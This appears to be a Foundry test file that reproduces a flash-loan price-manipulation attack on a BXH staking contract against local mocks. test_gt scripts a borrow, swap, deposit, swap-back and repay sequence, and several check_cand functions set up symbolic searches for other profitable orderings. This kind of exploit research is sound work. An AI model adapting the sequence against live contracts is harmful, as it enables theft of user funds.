// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./BXH.sol";
import "./BXHStaking.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract BXHTest is Test, BlockLoader {
    BXH bxh;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    BXHStaking bxhstaking;
    address attacker;
    address constant owner = address(0x123456);
    uint256 blockTimestamp = 1664374995;
    uint112 reserve0pair = 25147468936549224419158;
    uint112 reserve1pair = 150042582869434191452532;
    uint32 blockTimestampLastpair = 1664360756;
    uint256 kLastpair = 3772859961506335396254991567849051167345332565;
    uint256 price0CumulativeLastpair =
        1658542015723059495128658895585784161862152;
    uint256 price1CumulativeLastpair =
        32126006449291447357830235525583796774104;
    uint256 totalSupplybxh = 124962294544563937586572816;
    uint256 balanceOfbxhpair = 150042582869434191452532;
    uint256 balanceOfbxhattacker = 0;
    uint256 balanceOfbxhbxhstaking = 0;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 25147468936549224419158;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtbxhstaking = 40030764994324038311630;

    function setUp() public {
        vm.warp(blockTimestamp);
        attacker = address(this);
        vm.startPrank(owner);
        bxh = new BXH();
        usdt = new USDT();
        pair = new UniswapV2Pair(
            address(usdt),
            address(bxh),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        router = new UniswapV2Router(address(factory), address(0xdead));
        bxhstaking = new BXHStaking(
            address(bxh),
            1 ether,
            21543000,
            1000,
            owner
        );
        bxh.transfer(address(bxhstaking), 200000 ether);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        bxh.transfer(address(pair), balanceOfbxhpair);
        usdt.transfer(address(bxhstaking), balanceOfusdtbxhstaking);
        usdt.approve(attacker, UINT256_MAX);
        bxh.approve(attacker, UINT256_MAX);
        vm.stopPrank();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Bxh Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(bxh), usdt.decimals());
        queryERC20BalanceDecimals(address(bxh), address(bxh), bxh.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(usdt), bxh.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(pair), bxh.decimals());
        emit log_string("");
        emit log_string("Bxhstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(bxhstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(bxhstaking),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(usdt), attacker, usdt.decimals());
        queryERC20BalanceDecimals(address(bxh), attacker, bxh.decimals());
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_usdt(uint256 amount) internal {
        usdt.transferFrom(owner, attacker, amount);
    }

    function payback_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_bxh(uint256 amount) internal {
        bxh.transferFrom(owner, attacker, amount);
    }

    function payback_bxh(uint256 amount) internal {
        bxh.transfer(owner, amount);
    }

    function swap_pair_usdt_bxh(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(bxh);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_bxh_usdt(uint256 amount) internal {
        bxh.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(bxh);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function transaction_bxhstaking_bxh(uint256 amount) internal {
        bxhstaking.deposit(address(pair), amount);
    }

    function test_gt() public {
        borrow_usdt(2500000e18);
        printBalance("After step0 ");
        swap_pair_usdt_bxh(usdt.balanceOf(attacker));
        printBalance("After step1 ");
        transaction_bxhstaking_bxh(10e18);
        printBalance("After step2 ");
        swap_pair_bxh_usdt(bxh.balanceOf(attacker));
        printBalance("After step3 ");
        payback_usdt((2500000e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_usdt_bxh(amt3);
        payback_bxh(amt4);
        assert(!attackGoal());
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        swap_pair_bxh_usdt(amt4);
        payback_usdt(amt5);
        assert(!attackGoal());
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_usdt_bxh(amt3);
        swap_pair_usdt_bxh(amt4);
        payback_bxh(amt5);
        assert(!attackGoal());
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_usdt_bxh(amt3);
        swap_pair_bxh_usdt(amt4);
        payback_bxh(amt5);
        assert(!attackGoal());
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_usdt_bxh(amt3);
        swap_pair_bxh_usdt(amt4);
        swap_pair_usdt_bxh(amt5);
        payback_bxh(amt6);
        assert(!attackGoal());
    }
}
